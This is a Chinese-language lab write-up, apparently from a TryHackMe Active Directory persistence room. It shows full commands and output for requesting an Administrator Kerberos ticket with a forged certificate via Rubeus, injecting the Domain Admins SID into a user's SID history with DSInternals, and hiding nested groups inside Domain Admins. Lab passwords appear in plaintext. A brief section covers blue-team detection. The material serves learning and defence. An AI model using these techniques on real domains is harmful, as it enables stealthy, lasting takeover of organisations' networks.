<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240229185428443.png" alt="image-20240229185428443"></p>
<p>这里又找了几篇文章找到了解决办法，就是rdp连接目标服务器更改一下配置</p>
<pre><code class="hljs scss">xfreerdp /d:za.tryhackme.loc /u:<span class="hljs-string">'Administrator'</span> /p:<span class="hljs-string">'tryhackmewouldnotguess1@'</span> /v:THMDC.za.tryhackme.loc /cert:ignore +clipboard

#使用run弹窗，执行gpedit.<span class="hljs-built_in">msc</span>(或者在win搜索栏中搜索gpedit)
#编辑组策略-&gt;计算机配置-&gt;windows设置-&gt;安全设置-&gt;本地策略-&gt;安全选项-&gt;配置Kerberos允许的加密类型(右键编辑属性，勾选需要的加密类型选项并确定即可)
#编辑组策略-&gt;计算机配置-&gt;管理模版-&gt;系统-&gt;KDC-&gt;将KDC support for PKInit Freshness Extension设定为Enable

#通过RDP界面重启DC并退出rdp界面，然后继续在我们使用低权限AD用户所访问的THMWRK1跳板主机上进行操作。</code></pre>
<pre><code class="hljs scss">za\pauline<span class="hljs-selector-class">.hargreaves</span><span class="hljs-keyword">@THMWRK</span>1 <span class="hljs-attribute">C</span>:\Users\pauline.hargreaves&gt;<span class="hljs-attribute">C</span>:\Tools\Rubeus.exe asktgt /u
<span class="hljs-attribute">ser</span>:Administrator /<span class="hljs-attribute">enctype</span>:aes256 /<span class="hljs-attribute">certificate</span>:hybcx.pfx /<span class="hljs-attribute">password</span>:Password123 /outfile
:fullAdmin.kirbi /<span class="hljs-attribute">domain</span>:za.tryhackme.loc /<span class="hljs-attribute">dc</span>:<span class="hljs-number">10.200</span>.<span class="hljs-number">62.101</span>                            
                                                                                       
   ______        _                                                                     
  (_____ \      | |                                                                    
   _____) )_   _| |__  _____ _   _  ___                                                
  |  __  /| | | |  _ \| ___ | | | |/___)                                               
  | |  \ \| |_| | |_) ) ____| |_| |___ |                                               
  |_|   |_|____/|____/|_____)____/(___/                                                
                                                                                       
  v2.<span class="hljs-number">0.0</span>                                                                               
                                                                                       
[*] <span class="hljs-attribute">Action</span>: Ask TGT                                                                    
                                                                                       
[*] Using PKINIT with etype aes256_cts_hmac_sha1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">subject</span>: CN=User                  
[*] Building AS-REQ (w/ PKINIT preauth) <span class="hljs-attribute">for</span>: <span class="hljs-string">'za.tryhackme.loc\Administrator'</span>          
[+] TGT request successful!                                                            
[*] base64(ticket.kirbi):                                                              
                                                                                       
      doIGDDCCBgigAwIBBaEDAgEWooIFADCCBPxhggT4MIIE9KADAgEFoRIbEFpBLlRSWUhBQ0tNRS5MT0Oi 
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEHphLnRyeWhhY2ttZS5sb2OjggSwMIIErKADAgESoQMCAQKiggSe 
      BIIEmnF/<span class="hljs-number">9</span>r7X9Pi3J5uFeicRkVIOxP+dx7taz8l3i/<span class="hljs-number">5</span>hmApbCp6Iv7JoesIpz2iqnSoH7Q9y+UvSNQ6R 
      Iy6fF7ONLE0g//wCiYnxMV/zHiwHMmWLnRwv8jd7xnZMfel+GGybT24Ku0Q9xiQDvIBu4f6xX6Xbo6MP 
      nEFQmZO3WJ8w8vpibzZVPlHu0oUaxFKkZyBNe8Sg38QgT9QGdetO10OYS1pYThbrZSYJ2r2KJQpfr88S 
      YGrRGuQDxoql/x13hbourVdLNbp6jUlhQOH0aoCrtSf2BedwtjL3F/kDYtdpHGlhj5hjoJQZHBrzeUhJ 
      j0Pljx7AOHVnjoDs6jWE7avyZZY6FbyUzR7+U5u7kdjysh4Ag976Sbp2mMTXFjzQ73qwSaiQr4Ehek71 
      QlCnNO8bKnE91QvSFwOTVRQQ9t4qqnjlJph/A1wSo5c7b9GAATVrfA7hPGZAN//Qq8v6B0m/+ofvcgle 
      PjCtGgtc943usjP7ScE1EhlLyEWVwJLoMLVdmxWf7Q7yOjExPLXfAoOGIY5k+I8x0FbL0lXbteB1QxXJ 
      <span class="hljs-number">6</span>GMQ/xMun1yzqujxJlIa8To2OaLkO7+yPZw3AbcKG4bA+js75KmXvYWcnqATwSAGMV8izTdnZkozvVmA 
      dqpB3Qr+uMLoYbQTGjCNZXngkP9CFVyGWq3o5O/WT9JQLbjM2+h3gfi+XlPvhxTDDna6k7BKIApG+/zI 
      uZ3zTP/gtVyzuyWGWk1fmpgjJ4S7GLpKn9Z3OMSPoNglZDiLWiMYISboKF+kFAfTG3zSSgRrY0AhA66k 
      <span class="hljs-number">2</span>wjlamdKikiXQh4iHIGa+tdTcugewpbq3VSNKDm9HOiVcolopdZtPg/g3KjClPl26J/<span class="hljs-number">3</span>QFllJ++<span class="hljs-number">3</span>GU+<span class="hljs-number">5</span> 
      rFs2DTHAE8t6+RPKbootHGXiLNtycl+s3MXaceP7PV9AoJwlrvCAAcOrjzSrJJIC2dCPJFHkODusomPj 
      qRBF6HhzutUz4T8lE6EUzOR4NelcEJDiy939qmetTCq1WI24y/mrRlsS2XmZ+<span class="hljs-number">12</span>Z+zqiVcWKZsalA6MB 
      NmbiTXFwklKr+/TUDrboJfyqmG8kFnmvgbScaHTzE7DSWIi6PUfgciBRbXyLuVKuKOadvc7C0I6MjPbk 
      <span class="hljs-number">3</span>a2qc2BrtKLsRfv1hWI0HLl2W7tP3zE3zLONvrby5QToJJsMS1vY5hfvWw9+YwRtWfYZQl2dmeQMABLG 
      nA3X2YyCUH+<span class="hljs-number">1</span>GIoKoR5hy5I00Vg/Ak/XgYBv1+<span class="hljs-number">2</span>D7jtnj8vOvQWAvZeslxRFxsMGuBrK4pIp1NjKVXVM 
      /bbkULqjLn6VQnsvLPMkA4VmRGU0AF9fzzqAjYSQdGuC923RMdPXehHuLv0XygNuivSAb1mBmf2951wX 
      ZDZCbDlStQNRF2NLOh4qp7y9cRTi+v4W/<span class="hljs-number">9</span>JuKdO4oFw0zRBZkPokUcsnc0Rwu2r3ImRHMoEJlgl7qOYt 
      HOOtohfrOqKfZ+Ls6PVDuxYYUtUUaJGs6DglIabScfvGrN/zBxUOmk5ea3R94fNQhMaEZyQH4ALm14aP 
      vUdkxstdTwXyxuPpj1PSj3t8jasO/CyQWWqN6iVCrCjOlc6mq2gPU0y2o4H3MIH0oAMCAQCigewEgel9 
      geYwgeOggeAwgd0wgdqgKzApoAMCARKhIgQgd7iXvd7xTz/ZXRGvP+Iof3piKRTjXgaamnmziQZXYVqh 
      EhsQWkEuVFJZSEFDS01FLkxPQ6IaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEDhAAClERgP 
      MjAyNDAyMjkxMTM5MjBaphEYDzIwMjQwMjI5MjEzOTIwWqcRGA8yMDI0MDMwNzExMzkyMFqoEhsQWkEu 
      VFJZSEFDS01FLkxPQ6klMCOgAwIBAqEcMBobBmtyYnRndBsQemEudHJ5aGFja21lLmxvYw==         
                                                                                       
[*] Ticket written to fullAdmin.kirbi                                                  
                                                                                       
                                                                                       
  ServiceName              :  krbtgt/za.tryhackme.loc                                  
  ServiceRealm             :  ZA.TRYHACKME.LOC                                         
  UserName                 :  Administrator                                            
  UserRealm                :  ZA.TRYHACKME.LOC                                         
  StartTime                :  <span class="hljs-number">2</span>/<span class="hljs-number">29</span>/<span class="hljs-number">2024</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span>:<span class="hljs-number">20</span> AM                                    
  EndTime                  :  <span class="hljs-number">2</span>/<span class="hljs-number">29</span>/<span class="hljs-number">2024</span> <span class="hljs-number">9</span>:<span class="hljs-number">39</span>:<span class="hljs-number">20</span> PM                                     
  RenewTill                :  <span class="hljs-number">3</span>/<span class="hljs-number">7</span>/<span class="hljs-number">2024</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span>:<span class="hljs-number">20</span> AM                                     
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwa
rdable                                                                                 
  KeyType                  :  aes256_cts_hmac_sha1                                     
  Base64(key)              :  d7iXvd7xTz/ZXRGvP+Iof3piKRTjXgaamnmziQZXYVo=             
  ASREP (key)              :  B99608280DACD112BC2886CA0DFAF854C1DD09EDA0D5143A94ABE96E9
<span class="hljs-number">01580</span>EE</code></pre>
<p>之后再次尝试终于成功</p>
<pre><code class="hljs scss">za\pauline<span class="hljs-selector-class">.hargreaves</span><span class="hljs-keyword">@THMWRK</span>1 <span class="hljs-attribute">C</span>:\Users\pauline.hargreaves&gt;dir \\THMDC.za.tryhackme.loc\
c$\                                                                                    
 Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows                                
 Volume Serial Number is <span class="hljs-number">1634</span>-<span class="hljs-number">22</span>A9                                                     
                                                                                       
 Directory of \\THMDC.za.tryhackme.loc\c$                                              
                                                                                       
<span class="hljs-number">01</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">47</span> AM               <span class="hljs-number">103</span> delete-vagrant-user.ps1                         
<span class="hljs-number">05</span>/<span class="hljs-number">01</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">11</span> AM               <span class="hljs-number">169</span> dns_entries.csv                                 
<span class="hljs-number">09</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">19</span> AM              PerfLogs                                        
<span class="hljs-number">05</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">09</span>:<span class="hljs-number">32</span> AM              Program Files                                   
<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">08</span>:<span class="hljs-number">28</span> PM              Program Files (x86)                             
<span class="hljs-number">07</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">05</span>:<span class="hljs-number">05</span> PM             <span class="hljs-number">7</span>,<span class="hljs-number">168</span> shell.exe                                       
<span class="hljs-number">05</span>/<span class="hljs-number">01</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">17</span> AM             <span class="hljs-number">1</span>,<span class="hljs-number">725</span> thm-network-setup-dc.ps1                        
<span class="hljs-number">07</span>/<span class="hljs-number">06</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">03</span>:<span class="hljs-number">38</span> PM              tmp                                             
<span class="hljs-number">06</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">01</span>:<span class="hljs-number">58</span> PM              Tools                                           
<span class="hljs-number">02</span>/<span class="hljs-number">29</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> AM              Users                                           
<span class="hljs-number">04</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">06</span>:<span class="hljs-number">11</span> PM         vagrant [\\vboxsvr\vagrant]                     
<span class="hljs-number">07</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">51</span> AM              Windows                                         
               <span class="hljs-number">4</span> File(s)          <span class="hljs-number">9</span>,<span class="hljs-number">165</span> bytes                                          
               <span class="hljs-number">8</span> Dir(s)  <span class="hljs-number">51</span>,<span class="hljs-number">454</span>,<span class="hljs-number">889</span>,<span class="hljs-number">984</span> bytes free</code></pre>
<h1 id="0x05-通过-sid-历史记录进行持久化">0x05 通过 SID 历史记录进行持久化</h1>
<p>安全标识符 (SID) 之前已讨论过。但回顾一下，SID 用于在连接到资源时跟踪安全主体和帐户的访问权限。然而，帐户有一个有趣的属性，称为 SID 历史记录。</p>
<p>SID 历史记录的合法用例是使一个帐户的访问权限能够有效地克隆到另一个帐户。当组织忙于执行 AD 迁移时，这一点非常有用，因为它允许用户在迁移到新域时保留对原始域的访问权限。在新域中，用户将拥有新的 SID，但我们可以将用户现有的 SID 添加到 SID 历史记录中，这仍然允许他们使用新帐户访问先前域中的资源。虽然 SID 历史记录有利于迁移，但我们作为攻击者也可以滥用此功能来实现持久性。</p>
<p>历史可以是我们想要的任何样子</p>
<p>问题是，SID 历史记录并不仅限于包含来自其他域的 SID。有了正确的权限，我们只需将当前域的 SID 添加到我们控制的帐户的 SID 历史记录中即可。关于这种持久性技术的一些有趣的注释：</p>
<ul>
<li>我们通常需要域管理员权限或同等权限才能执行此攻击。</li>
<li>当帐户创建登录事件时，与该帐户关联的 SID 将添加到用户的令牌中，然后由该令牌确定与该帐户关联的权限。这包括组 SID。</li>
<li>如果我们注入企业管理员 SID，我们可以进一步采取这种攻击，因为这会提升帐户的权限，使其成为林中所有域中的域管理员。</li>
<li>由于 SID 已添加到用户的令牌中，因此即使该帐户不是实际组的成员，也会尊重权限。这使得这是一种非常狡猾的持久方法。我们拥有危害整个域（也许是整个林）所需的所有权限，但我们的帐户可以只是一个普通用户帐户，仅具有域用户组的成员身份。通过始终使用此帐户来更改另一个帐户的 SID 历史记录，我们可以将偷偷摸摸的行为提升到另一个级别，因此初始持久性向量不那么容易被发现和补救。</li>
</ul>
<h2 id="锻造历史">锻造历史</h2>
<p>在下一步中，使用管理员凭据在THMDC上获取一个SSH会话。在伪造SID历史之前，让我们首先获取一些关于SID的信息。首先，确保我们的低权限用户当前没有任何SID历史信息：</p>
<p>Your credentials have been generated: Username: louis.cole Password: Password!</p>
<pre><code class="hljs scss">za\administrator<span class="hljs-keyword">@THMDC</span> <span class="hljs-attribute">C</span>:\Users\Administrator&gt;powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS <span class="hljs-attribute">C</span>:\Users\Administrator&gt; Get-ADUser louis.cole -Properties sidhistory,memberof


DistinguishedName : CN=pauline.hargreaves,OU=Sales,OU=People,DC=za,DC=tryhackme,DC=loc 
Enabled           : True
GivenName         : Pauline
MemberOf          : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc}
Name              : pauline.hargreaves
ObjectClass       : user
ObjectGUID        : daa57f4b-cdf8-<span class="hljs-number">48</span>a0-<span class="hljs-number">8</span>e92-<span class="hljs-number">8</span>e03c7b88c54
SamAccountName    : pauline.hargreaves
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">1121</span>
SIDHistory        : {}
Surname           : Hargreaves
UserPrincipalName :</code></pre>
<p>可以看到这里sid历史为空：这证实我们的用户当前没有设置任何 SID 历史记录。让我们获取 Domain Admins 组的 SID，因为这是我们要添加到 SID 历史记录中的组：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240301083646807.png" alt="image-20240301083646807"></p>
<p>我们可以使用 Mimikatz 之类的东西来添加 SID 历史记录。然而，最新版本的 Mimikatz 有一个缺陷，不允许它修补 LSASS 来更新 SID 历史记录。因此我们需要使用其他东西。在这种情况下，我们将使用 DSInternals 工具直接修补 ntds.dit 文件，即存储所有信息的 AD 数据库：</p>
<pre><code class="hljs scss">Install-Module DSInternals -Force
Import-Moduls DSInternals
<span class="hljs-comment">//这里在下载的时候一直报错，不知为何，尝试了半天无果，发现目标机已经有改工具了。。。</span>

Stop-Service -Name ntds -force 
Add-ADDBSidHistory -SamAccountName 'louis<span class="hljs-selector-class">.cole</span>' -SidHistory 'S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">512</span>' -DatabasePath C:\Windows\NTDS\ntds.dit 
Start-Service -Name ntds</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240301083942800.png" alt="image-20240301083942800"></p>
<p>NTDS 服务运行时，NTDS 数据库被锁定。为了修补我们的 SID 历史记录，我们必须首先停止该服务。补丁完成后必须重新启动NTDS服务，否则整个网络的认证将无法进行。</p>
<p>执行这些步骤后，让我们使用低权限凭据通过 SSH 登录到 THMWRK1，并验证是否已添加 SID 历史记录以及我们现在是否具有域管理员权限：</p>
<pre><code class="hljs scss">za\louis<span class="hljs-selector-class">.cole</span><span class="hljs-keyword">@THMWRK</span>1 <span class="hljs-attribute">C</span>:\Users\louis.cole&gt;powershell -ep bypass                        
Windows PowerShell                                                                     
Copyright (C) Microsoft Corporation. All rights reserved.                              
                                                                                       
PS <span class="hljs-attribute">C</span>:\Users\louis.cole&gt; Get-ADUser louis.cole -Properties sidhistory                   
                                                                                       
                                                                                       
DistinguishedName : CN=louis.cole,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc    
Enabled           : True                                                               
GivenName         : Louis                                                              
Name              : louis.cole                                                         
ObjectClass       : user                                                               
ObjectGUID        : bf78bdb9-<span class="hljs-number">3289</span>-<span class="hljs-number">461</span>d-<span class="hljs-number">8193</span>-d7fd88d3b23b                               
SamAccountName    : louis.cole                                                         
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">1120</span>                     
SIDHistory        : {S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">512</span>}                    
Surname           : Cole                                                               
UserPrincipalName :</code></pre>
<pre><code class="hljs scss">PS C:\Users\louis.cole&gt; dir \\thmdc.za.tryhackme.loc\c$                                
                                                                                       
                                                                                       
    Directory: \\thmdc.za.tryhackme.loc\c$                                             
                                                                                       
                                                                                       
Mode                LastWriteTime         Length Name                                  
----                -------------         ------ ----                                  
d-----        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">8</span>:<span class="hljs-number">19</span> AM                PerfLogs                              
d-r---        <span class="hljs-number">5</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">10</span>:<span class="hljs-number">32</span> AM                Program Files                         
d-----        <span class="hljs-number">3</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">8</span>:<span class="hljs-number">28</span> PM                Program Files (x86)                   
d-----         <span class="hljs-number">7</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">4</span>:<span class="hljs-number">38</span> PM                tmp                                   
da----        <span class="hljs-number">6</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">58</span> PM                Tools                                 
d-r---        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">10</span>:<span class="hljs-number">29</span> PM                Users                                 
d----l        <span class="hljs-number">4</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">7</span>:<span class="hljs-number">11</span> PM                vagrant                               
d-----         <span class="hljs-number">7</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">9</span>:<span class="hljs-number">51</span> AM                Windows                               
-a----         <span class="hljs-number">1</span>/<span class="hljs-number">4</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">7</span>:<span class="hljs-number">47</span> AM            <span class="hljs-number">103</span> delete-vagrant-user.ps1               
-a----         <span class="hljs-number">5</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">9</span>:<span class="hljs-number">11</span> AM            <span class="hljs-number">169</span> dns_entries.csv                       
-a----         <span class="hljs-number">7</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">05</span> PM           <span class="hljs-number">7168</span> shell.exe                             
-a----         <span class="hljs-number">5</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">9</span>:<span class="hljs-number">17</span> AM           <span class="hljs-number">1725</span> thm-network-setup-dc.ps1</code></pre>
<p>根据上面的输出，效果很好！我们能够伪造我们的 SID 历史记录，授予我们的低特权帐户 DA 访问权限！</p>
<h2 id="蓝队的干草叉和火把">蓝队的干草叉和火把</h2>
<p>如果蓝队通过RDP访问域内主机并使用AD用户和组管理单元，那么蓝队将能够查看添加到当前AD用户的SID历史记录属性；但是，即使蓝队具有最高权限，也无法通过GUI界面直接删除AD用户的SID历史记录属性，因为它是受保护的。</p>
<p>为了成功删除攻击者所添加的SID历史记录，蓝队必须使用诸如AD-RSAT PowerShell cmlet之类的工具；此外，蓝队还必须先找到攻击者所修改的SID历史记录，这需要蓝队成员主动过滤并查看用户的相关属性，否则很难找到恶意的SID 历史记录，因为只有在用户进行身份验证时才会应用和使用这些SID历史记录。</p>
<p>想象一下，您是蓝队，正在处理刚刚执行域名回收的事件。您将 krbtgt 帐户的密码轮换了两次，删除了金票和银票，并从头开始重建了整个 CA 服务器，只是为了看到攻击者仍在使用低权限帐户执行 DA 命令。这不会是美好的一天。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240301084952802.png" alt="image-20240301084952802"></p>
<h1 id="0x06-通过组成员身份实现持久性">0x06 通过组成员身份实现持久性</h1>
<p>如果我们不想篡改SID历史记录，我们可以直接将自己添加到AD组中以实现持久化。虽然 SID 历史记录是一种很好的持久性技术，但凭证轮换和清理仍然可以消除我们的持久性。在某些情况下，通过针对 AD 组本身来执行持久性可能会更好。</p>
<h2 id="通过团体成员身份坚持下去">通过团体成员身份坚持下去</h2>
<p>如任务1所讨论的那样，最高权限的帐户或组并不总是用于持久性的最佳选择。比其他组更密切地监视了特权组的变化。任何被归类为受保护组的组，例如域管理员或企业管理员，都会接受额外的安全审查。因此，如果我们想通过组成员身份持久存在，我们可能需要在将我们自己的帐户添加到持久性的组时进行创造性的考虑：</p>
<ul>
<li>IT Support组可用于获取诸如强制更改用户密码之类的特殊权限，尽管在大多数情况下，我们可能无法重置特权用户的密码，但是我们能够尝试重置低特权用户的密码并继续将访问权限扩展到目标工作站。</li>
<li>目标域网络所提供的具有本地管理员权限的组通常不会像被保护组那样被密切监控，我们可以通过修改组成员关系，来拥有对目标主机的本地管理员权限。</li>
<li>此类权限维持技术并不总是与直接的特权有关，有时，具有间接特权(例如对组策略对象的所有权)的组也同样适合我们用来实现权限维持。</li>
</ul>
<h2 id="nested-groups嵌套组">Nested Groups(嵌套组)</h2>
<p>在大多数企业网络环境中，都存在大量的递归组。递归组是指某个组是另一个组的成员，我们可以认为这是组嵌套(group nesting)，这种组嵌套可用于在AD域网络中创建更有组织性的结构。</p>
<p>以IT Support(技术支持)组为例，IT Support是一个通用的组，因此，在这个组下面可能会有像Helpdesk、Access Card Managers和Network Managers这样的子组；我们可以将所有这些组作为成员添加到IT Support组中，这将为子组中的所有用户分配与IT Support组相关联的权限和特权，同时我们还可以为每个子组分配更细致的权限和特权。</p>
<p>虽然组嵌套有助于组织AD域网络，但是它确实降低了关于那些具有有效访问权限的AD帐户的可见性。再次以IT Support组为例，如果我们向AD域查询IT Support组的成员，它可能会告诉我们该组有三个成员，然而，这个数字并不真实，因为IT Support组中的三个成员也可以是组。为了更充分地了解具有有效访问权限的帐户数量，我们还必须继续枚举IT Support组中的子组，但是这些子组本身也可以有子组作为成员。那么问题最终就变成了:“我们应该枚举多少层，才能得到真正的具有有效访问权限的AD帐户数目?”(这里的有效访问权限是指由于组成员关系而分配给某个AD帐户的权限)</p>
<p>多层组嵌套关系也会让蓝队更加难以监控权限分配情况，假设当一个新成员被添加到Domain Admins组时会向蓝队发出警报，这是一个很好的警报，但是如果攻击者将用户添加到Domain Admins组中的子组中，则可能并不会触发该警报。这是一个非常常见的问题，因为AD是由AD团队管理的，而警报和监控则是由InfoSec(信息安全)团队管理的；我们作为攻击者所需要的是以上两个团队之间存在一些沟通上的错误，那么当我们使用子组进行用户添加时，就不会有警报消息被发送给蓝队。</p>
<p>作为攻击者，我们可以利用这种被降低的权限分配可见性来尝试执行权限维持操作。我们可以不将目标直接锁定在那些能让我们访问AD域的特权组上，而是转而把注意力集中在子组上，也就是说：我们不添加直接新成员到那些可能会向蓝队发出警报的特权组中，而是将低权限的用户添加到可能未被监控的那些子组中。</p>
<h2 id="基于嵌套组实现权限维持">基于嵌套组实现权限维持</h2>
<p>我们首先使用administrator帐户通过SSH登录到跳板主机，然后创建一个新的基础组，并且将该组隐藏在People-&gt;IT OU(组织单元)中：</p>
<pre><code class="hljs scss">PS C:\Users\Administrator.ZA&gt;New-ADGroup -Path <span class="hljs-string">"OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC"</span> -Name <span class="hljs-string">"hybcx Net Group 1"</span> -SamAccountName <span class="hljs-string">"hybcx_nestgroup1"</span> -DisplayName <span class="hljs-string">"hybcx Nest Group 1"</span> -GroupScope Global -GroupCategory Security</code></pre>
<p>然后让我们在People-&gt;Sales OU(组织单元)中创建另一个组，并且将我们刚才的基础组作为组成员添加进来：</p>
<pre><code class="hljs scss">PS C:\Users\Administrator.ZA&gt;New-ADGroup -Path <span class="hljs-string">"OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC"</span> -Name <span class="hljs-string">"hybcx Net Group 2"</span> -SamAccountName <span class="hljs-string">"hybcx_nestgroup2"</span> -DisplayName <span class="hljs-string">"hybcx Nest Group 2"</span> -GroupScope Global -GroupCategory Security 

PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity <span class="hljs-string">"hybcx_nestgroup2"</span> -Members <span class="hljs-string">"hybcx_nestgroup1"</span></code></pre>
<p>我们重复执行几次上述两个步骤，每次都将前一个组添加为新的组的成员：</p>
<pre><code class="hljs scss">PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path <span class="hljs-string">"OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC"</span> -Name <span class="hljs-string">"hybcx Net Group 3"</span> -SamAccountName <span class="hljs-string">"hybcx_nestgroup3"</span> -DisplayName <span class="hljs-string">"hybcx Nest Group 3"</span> -GroupScope Global -GroupCategory Security

PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity <span class="hljs-string">"hybcx_nestgroup3"</span> -Members <span class="hljs-string">"hybcx_nestgroup2"</span>

PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path <span class="hljs-string">"OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC"</span> -Name <span class="hljs-string">"hybcx Net Group 4"</span> -SamAccountName <span class="hljs-string">"hybcx_nestgroup4"</span> -DisplayName <span class="hljs-string">"hybcx Nest Group 4"</span> -GroupScope Global -GroupCategory Security

PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity <span class="hljs-string">"hybcx_nestgroup4"</span> -Members <span class="hljs-string">"hybcx_nestgroup3"</span>

PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path <span class="hljs-string">"OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC"</span> -Name <span class="hljs-string">"hybcx Net Group 5"</span> -SamAccountName <span class="hljs-string">"hybcx_nestgroup5"</span> -DisplayName <span class="hljs-string">"hybcx Nest Group 5"</span> -GroupScope Global -GroupCategory Security

PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity <span class="hljs-string">"hybcx_nestgroup5"</span> -Members <span class="hljs-string">"hybcx_nestgroup4"</span>

#上述组名自定义即可</code></pre>
<p>现在让我们将上述所创建的最后一个组添加到域管理员组：</p>
<pre><code class="hljs scss">PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity <span class="hljs-string">"Domain Admins"</span> -Members <span class="hljs-string">"hybcx_nestgroup5"</span></code></pre>
<p>最后，我们将低权限的AD用户添加到我们先前所创建的第一个组中：</p>
<pre><code class="hljs scss"><span class="hljs-selector-id">#PS</span> C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity <span class="hljs-string">"hybcx_nestgroup1"</span> -Members <span class="hljs-string">"&lt;low privileged username&gt;"</span>

